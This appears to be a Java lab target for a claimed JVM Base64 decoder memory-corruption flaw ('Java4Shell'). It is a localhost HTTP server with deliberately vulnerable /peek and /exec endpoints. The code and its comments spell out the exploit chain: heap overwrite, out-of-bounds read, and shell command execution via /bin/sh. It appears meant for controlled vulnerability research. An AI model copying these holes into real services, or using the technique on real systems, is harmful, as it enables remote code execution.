import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.ByteArrayOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.TimeUnit;

/**
 * CVE-2026-114938 (Java4Shell) controlled RCE lab target.
 *
 * This is the *target* half of the lab.  It models a service with a
 * maintenance hook: each request allocates a Base64 scratch buffer and, in
 * the same thread/TLAB, a session blob whose config bytes are later executed.
 * The blob is initialised with a safe command; the service only executes a
 * config string that begins with the lab marker "J4S:".
 *
 * The vulnerability supplies the missing primitive:
 *
 *   decode(trigger, scratch[66])
 *       -> AVX-512 VBMI tail store writes 62 bytes past scratch
 *       -> the following blob's length field becomes 0x699aa669
 *       -> blob[off] is no longer bounds-checked
 *       -> /peek can read the attacker's own request bytes out of the heap
 *       -> /exec can execute them through the maintenance hook
 *
 * The "J4S:" prefix is a lab guard: it prevents accidental execution of
 * random heap bytes while the client scans for its payload.  It is not a
 * security boundary and is not part of the vulnerability.
 *
 * Runs under Intel SDE on hosts without AVX-512 VBMI.
 */
public final class RceLab {
    private static final byte[] TRIGGER = trigger();
    private static final byte[] TEMPLATE =
            "echo safe-maintenance".getBytes(StandardCharsets.US_ASCII);

    private static final int SCRATCH_LEN = 66;  // aligns the store onto blob's length
    private static final int BLOB_LEN = 100;
    private static final int MAX_PEEK = 4096;
    private static final String LOG = "/tmp/java4shell-rce.log";

    private static volatile Session state;
    private static volatile byte[] payload;

    static byte[] trigger() {
        boolean jdk17 = Runtime.version().feature() <= 17;
        int n = jdk17 ? 128 : 64;
        byte[] t = new byte[n + 1];
        Arrays.fill(t, (byte) 'A');
        t[n] = (byte) '=';
        return t;
    }

    /** scratch and blob are allocated back-to-back, in one constructor. */
    static final class Session {
        final byte[] scratch = new byte[SCRATCH_LEN];
        final byte[] blob = new byte[BLOB_LEN];

        Session() {
            // No allocation here: the template lives in a static field, so the
            // next allocation after this constructor is the attacker payload.
            System.arraycopy(TEMPLATE, 0, blob, 0, TEMPLATE.length);
            Arrays.fill(blob, TEMPLATE.length, blob.length, (byte) '.');
        }
    }

    public static void main(String[] args) throws Exception {
        int port = 18080;
        int warmup = 1500;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--port":
                    port = Integer.parseInt(args[++i]);
                    break;
                case "--warmup":
                    warmup = Integer.parseInt(args[++i]);
                    break;
                default:
                    System.err.println("unknown option: " + args[i]);
                    System.exit(2);
            }
        }

        // Warm the (src,dst) decode path so C2 substitutes the AVX-512 stub.
        // warm[] is large enough that the trigger's store stays in bounds.
        byte[] warm = new byte[256];
        Base64.Decoder decoder = Base64.getDecoder();
        for (int i = 0; i < warmup; i++) {
            try {
                decoder.decode(TRIGGER, warm);
            } catch (IllegalArgumentException ignored) {
                // expected: the invalid tail is rejected after the store
            }
        }

        HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", port), 0);
        // null executor = requests are served on one thread, keeping TLAB order.
        server.setExecutor(null);

        server.createContext("/health", ex -> send(ex, 200, "ok"));

        server.createContext("/warm", ex -> handle(ex, () -> {
            int n = intParam(ex, "n", 0);
            for (int i = 0; i < n; i++) {
                try {
                    decoder.decode(TRIGGER, warm);
                } catch (IllegalArgumentException ignored) {
                }
            }
            send(ex, 200, "warmed " + n);
        }));

        server.createContext("/trigger", ex -> handle(ex, () -> {
            String b64 = param(ex, "cmd");
            String cmd;
            try {
                cmd = new String(Base64.getUrlDecoder().decode(b64), StandardCharsets.US_ASCII);
            } catch (RuntimeException e) {
                send(ex, 400, "bad cmd encoding");
                return;
            }
            if (cmd.isEmpty() || cmd.length() > 200) {
                send(ex, 400, "bad cmd length");
                return;
            }

            int before = trigger(cmd);
            int after = state.blob.length;
            send(ex, 200, "before=" + before
                    + "\nafter=" + after
                    + "\nhex=" + Integer.toHexString(after)
                    + "\nunsigned=" + Integer.toUnsignedString(after) + "\n");
        }));

        // The vulnerable read primitive: a maintenance debug endpoint that
        // returns bytes from the session config blob at an attacker offset.
        server.createContext("/peek", ex -> handle(ex, () -> {
            Session s = state;
            if (s == null) {
                send(ex, 400, "no session; call /trigger first");
                return;
            }
            int off = intParam(ex, "off", -1);
            int len = intParam(ex, "len", 128);
            if (off < 0 || len < 1 || len > MAX_PEEK) {
                send(ex, 400, "bad range");
                return;
            }
            byte[] out = new byte[len];
            for (int i = 0; i < len; i++) out[i] = s.blob[off + i];
            send(ex, 200, hex(out));
        }));

        // The sink: load the maintenance command from the (now corrupted)
        // blob at an attacker offset and run it.
        server.createContext("/exec", ex -> handle(ex, () -> {
            Session s = state;
            if (s == null) {
                send(ex, 400, "no session; call /trigger first");
                return;
            }
            if (s.blob.length == BLOB_LEN) {
                send(ex, 400, "no corruption; refusing maintenance exec");
                return;
            }
            int off = intParam(ex, "off", -1);
            if (off < BLOB_LEN) {
                send(ex, 400, "offset must be outside the original blob");
                return;
            }

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            for (int i = 0; i < 256; i++) {
                byte v = s.blob[off + i];
                if (v == 0) break;
                if (v < 0x20 || v > 0x7e) {
                    send(ex, 400, "non-printable config byte");
                    return;
                }
                buf.write(v);
            }
            String recovered = buf.toString(StandardCharsets.US_ASCII);
            if (!recovered.startsWith("J4S:")) {
                send(ex, 400, "not a lab payload");
                return;
            }
            String cmd = recovered.substring(4);
            if (cmd.isEmpty()) {
                send(ex, 400, "empty command");
                return;
            }

            Process p = new ProcessBuilder("/bin/sh", "-c", cmd)
                    .redirectErrorStream(true)
                    .start();
            String out = new String(p.getInputStream().readAllBytes(),
                    StandardCharsets.UTF_8);
            if (!p.waitFor(10, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                send(ex, 504, "command timeout");
                return;
            }
            int rc = p.exitValue();
            log("off=" + off + " cmd=" + cmd + " rc=" + rc + " out=" + out.trim());

            send(ex, 200, "RCE CONFIRMED"
                    + "\noffset=" + off
                    + "\ncmd=" + cmd
                    + "\nexit=" + rc
                    + "\n" + out);
        }));

        server.start();
        System.out.println("READY port=" + port + " trigger=" + TRIGGER.length + "B");
        System.out.flush();
    }

    private static int trigger(String cmd) {
        // Allocated *before* the session, so it cannot sit between blob and payload.
        byte[] cmdBytes = cmd.getBytes(StandardCharsets.US_ASCII);

        Session s = new Session();

        // The first allocation after Session() and its fields: the payload.
        byte[] p = new byte[4 + cmdBytes.length + 1];
        p[0] = 'J';
        p[1] = '4';
        p[2] = 'S';
        p[3] = ':';
        System.arraycopy(cmdBytes, 0, p, 4, cmdBytes.length);
        p[p.length - 1] = 0;

        state = s;
        payload = p; // keep alive

        int before = s.blob.length;
        try {
            Base64.getDecoder().decode(TRIGGER, s.scratch);
        } catch (IllegalArgumentException expected) {
            // The store has already happened.
        }
        return before;
    }

    private interface Body {
        void run() throws Exception;
    }

    private static void handle(HttpExchange ex, Body body) {
        try {
            body.run();
        } catch (ArrayIndexOutOfBoundsException e) {
            try {
                send(ex, 400, "out of bounds (no corruption)");
            } catch (IOException ignored) {
            }
        } catch (Exception e) {
            try {
                send(ex, 400, e.getClass().getSimpleName() + ": " + e.getMessage());
            } catch (IOException ignored) {
            }
        } finally {
            ex.close();
        }
    }

    private static void send(HttpExchange ex, int code, String text) throws IOException {
        byte[] b = text.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
        ex.sendResponseHeaders(code, b.length);
        try (OutputStream os = ex.getResponseBody()) {
            os.write(b);
        }
    }

    private static String param(HttpExchange ex, String key) {
        String q = ex.getRequestURI().getRawQuery();
        if (q == null) return null;
        for (String kv : q.split("&")) {
            int i = kv.indexOf('=');
            if (i > 0 && kv.substring(0, i).equals(key)) {
                return kv.substring(i + 1);
            }
        }
        return null;
    }

    private static int intParam(HttpExchange ex, String key, int def) {
        String v = param(ex, key);
        if (v == null || v.isEmpty()) return def;
        try {
            return Integer.parseInt(v);
        } catch (NumberFormatException e) {
            return def;
        }
    }

    private static final char[] HEX = "0123456789abcdef".toCharArray();

    private static String hex(byte[] data) {
        char[] c = new char[data.length * 2];
        for (int i = 0; i < data.length; i++) {
            int v = data[i] & 0xff;
            c[2 * i] = HEX[v >>> 4];
            c[2 * i + 1] = HEX[v & 0xf];
        }
        return new String(c);
    }

    private static void log(String line) {
        try (FileWriter w = new FileWriter(LOG, true)) {
            w.write(line + "\n");
        } catch (IOException ignored) {
        }
    }
}
